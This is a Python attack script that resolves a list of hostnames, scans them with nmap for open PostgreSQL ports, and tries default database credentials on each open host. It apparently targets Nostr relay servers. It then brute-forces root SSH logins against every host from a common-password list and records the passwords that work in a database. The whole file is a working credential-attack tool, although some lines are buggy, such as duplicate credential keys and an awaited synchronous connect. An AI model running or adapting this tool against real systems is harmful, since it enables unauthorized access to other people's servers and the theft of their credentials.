import asyncio
import socket
import nmap
import psycopg2
import paramiko
import os

from dotenv import load_dotenv

GREEN = '\033[32m'
RED = '\033[31m'
RESET = '\033[0m'

load_dotenv()

conn = psycopg2.connect(
    host=os.getenv('DB_HOST'),
    port=os.getenv('DB_PORT'),
    dbname=os.getenv('DB_NAME'),
    user=os.getenv('DB_USER'),
    password=os.getenv('DB_PASSWORD')
)





def initialize_database():
    # Load environment variables from .env file


    try:

        cur = conn.cursor()
        # Create the 'hosts' table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS hosts (
                id SERIAL PRIMARY KEY,
                hostname VARCHAR(255),
                ip_address VARCHAR(255),
                open_ports VARCHAR(255),
                postgres_open BOOLEAN,
                scanned_today DATE
            );
        """)

        conn.commit()

        print("Database initialization complete.")

    except psycopg2.Error as e:
        print(f"Error occurred during database initialization: {e}")

# Call the function to initialize the database
initialize_database()



def read_hostnames_file():
    # Open the file for reading
    with open('hostnames.txt', 'r') as f:
        # Read all lines from the file into a list
        hostnames = f.readlines()

    # Strip newline characters from each line in the list
    hostnames = [hostname.strip() for hostname in hostnames]

    # Return the list of hostnames
    return hostnames

hostnames = read_hostnames_file()

credentials = {
    'postgres': 'postgres',
    'nostr': 'nostr',
    'nostr_ts_relay': 'nostr_ts_relay',
    'postgres': 'password',
    'postgres': 'admin',
    'admin': 'admin',
    'admin': 'password'
}

async def resolve_hosts(hosts):


    results = {}
    for host in hosts:
        cur = conn.cursor()
        cur.execute("SELECT ip_address FROM hosts WHERE hostname = %s", (host,))
        result = cur.fetchone()
        if result is not None:
            results[host] = result[0]
        else:
            try:
                ip = await asyncio.get_event_loop().getaddrinfo(host, None)
                ip_address = ip[0][4][0]
                results[host] = ip_address
                cur.execute("INSERT INTO hosts (hostname, ip_address) VALUES (%s, %s)", (host, ip_address))
                conn.commit()
            except socket.error as err:
                print(f"Error resolving {host}: {err}")

    return results

async def scan_host(host, hostname, scanner):


    print(f"Scanning host {hostname} ({host})...")
    scanner.scan(host, arguments='-p 5432')
    results = scanner[host]['tcp']
    status = results[5432]['state']

    if status == 'open':
        cur = conn.cursor()
        print(f"{GREEN}Port 5432 is open on host {RESET}{hostname} ({host})!")
        cur.execute("UPDATE hosts SET postgres_open = true WHERE hostname = %s", (hostname,))
        conn.commit()
        cur.close()
        conn.close()
        return hostname

    return None

async def connect_to_postgres(hosts, credentials):
    for host in hosts:
        for username, password in credentials.items():
            try:
                conn = await psycopg2.connect(
                    host=host,
                    user=username,
                    password=password
                )
                print(f"{GREEN}Successfully connected to PostgreSQL on {RESET}{host} {GREEN}using credentials: {RESET}{username}:{password}")
                conn.close()
                break  # Stop trying credentials if one works
            except Exception as e:
                print(f"{RED}Could not connect to PostgreSQL on {RESET}{host} {RED}with credentials: {RESET}{username}:{password}: {e}")

async def ssh_login(ip_dict, password_file):
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.read().splitlines()

        for host, ip in ip_dict.items():
            print(f"Attempting SSH login on {ip}...")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            for pw in passwords:
                try:
                    print(f"{GREEN}Trying {RESET}{pw} {GREEN} as a password{RESET}")
                    await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: client.connect(str(ip), username='root', password=pw, timeout=15),
                    )
                    print(f"{GREEN}Successful login on {RESET}{ip}{GREEN} with password:{RESET} {pw}")
                    cur = conn.cursor()
                    cur.execute("INSERT INTO ssh_logins (hostname, ip_address, password) VALUES (%s, %s, %s)", (host, ip, pw))
                    conn.commit()
                    client.close()
                    break
                except paramiko.AuthenticationException:
                    # Incorrect password, continue to the next one
                    continue
                except paramiko.SSHException:
                    print(f"{RED}Failed to connect to{RESET} {ip}")
                    break
                except socket.timeout:
                    print(f"{RED}Connection timed out for {RESET}{ip}")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError as e:
                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip}")
                    print(f"{RED}Error: {RESET}{str(e)}")
                    break



async def main():
    # Resolve hosts asynchronously
    host_dict = await resolve_hosts(hostnames)
    print(host_dict)

    # Create a new Nmap scanner object
    scanner = nmap.PortScanner()

    # Scan hosts and collect open ports
    postgres_open = await asyncio.gather(
        *[scan_host(host, hostname, scanner) for hostname, host in host_dict.items()]
    )
    postgres_open = [host for host in postgres_open if host is not None]

    # Connect to PostgreSQL using collected open hosts and credentials
    await connect_to_postgres(postgres_open, credentials)

    # Perform SSH login on the resolved hosts
    await ssh_login(host_dict, 'common_root_passwords.txt')

# Run the main function
asyncio.run(main())
